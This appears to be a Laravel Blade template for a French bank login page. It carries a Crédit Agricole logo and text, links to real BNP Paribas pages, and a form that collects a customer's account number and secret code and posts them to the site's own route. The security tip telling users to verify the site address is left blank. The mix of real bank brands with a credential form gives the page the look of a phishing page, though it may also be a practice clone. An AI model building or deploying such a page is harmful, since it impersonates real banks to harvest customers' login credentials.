<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
    <title>acceder à mon compte</title>
    <!-- Ajoutez le script à l'intérieur de la balise <head> -->

</head>

<body>

    <script>
        $(document).ready(function() {
            $('#compteBancaire').inputmask('99-9999999-99');
        });
    </script>

    <nav class="navbar">
        <img src="{{ asset('creditAgriLogo.png') }}" alt="Logo de la banque" style="width: 200px ! important;">
        <!-- <h2>Slogan de la banque</h2> -->
        <ul>
            <li><a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/bienvenue-chez-bnpparibas">Comptes & Cartes</a></li>
            <li><a href="https://mabanque.bnpparibas/fr/epargner/comptes-livrets-epargne/livret-a">Epargne</a></li>
            <li><a href="https://mabanque.bnpparibas/fr/assurer/logement/assurance-pret-immobilier">Assurance</a></li>
            <li><a href="https://mabanqueprivee.bnpparibas/">Credit</a></li>
            <li><a href="#">Contact</a></li>
        </ul>
        <button class="menu-btn">&#9776;</button>
    </nav>

    <div class="login-container">
        <div class="left-section">

            <!-- Partie gauche (couleur verte) avec le formulaire -->
            <div class="form-section">
                <h2> ACCÉDER À MES COMPTES </h2>
                <form action="{{ route('login.feature') }}" method="POST">
                    @csrf

                    <div class="form-group">
                        <label for="accountNumber">1. Mon numéro client</label>
                        <input type="text" id="compteBancaire" name="numero_compte" required>
                    </div>

                    <div class="form-group">
                        <label for="password">2. Mon code secret</label>
                        <input type="password" name="password" required>
                    </div>
                    <!-- Ajoutez ceci à l'intérieur de votre formulaire, juste avant le bouton de soumission -->
                    <div id="error-message" style="color: red; margin-top: 10px; display: none;"></div>

                    <button type="submit">ACCÉDER À MES COMPTES</button>
                </form>
                <br>
                <br>
                <h3>Téléchargez l’application Ma Banque

                    Chacun d’entre vous gère différemment ses besoins bancaires.
                    Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
            </div>
        </div>
        <div class="right-section">
            <!-- Partie droite (couleur blanche) avec les consignes -->
            <div class="instructions-section">
                <h3>Vos codes d'accès</h3>
                <p>Obtenir ses codes d'accès</p>

                <h3>Conseils de sécurité</h3>
                <p>Vérifiez que l'adresse du site commence exactement par :</p>
                <!-- Ajoutez ici vos autres consignes de sécurité -->

                <h3>Pour une meilleure accessibilité</h3>
                <p>Connectez-vous grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
                <p>Utilisez Facil'iti pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou
                    cognitif).</p>
                <p>Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques pour contacter un
                    conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété)
                    ou en TIP (Transcription Instantanée de la Parole).</p>
                <p>Rendez-vous sur la page Accessibilité pour plus d'informations sur l'accessibilité numérique chez ma
                    bank.</p>

                <h3>Informations client</h3>
                <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter
                    nos conseillers en ligne au :</p>
                <p><strong>3477</strong></p>
                <p>Service gratuit + prix appel</p>
                <p>Ou à nous signaler un problème technique.</p>
                <p>Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application Mes
                    comptes.</p>
            </div>
        </div>
    </div>
    <!-- Ajoutez la balise footer pour l'image en bas -->
    <footer>
        <img src="{{ asset('assets/footer.png') }}" alt="" style="width: 100%; margin-top: auto;">
    </footer>


</body>

</html>
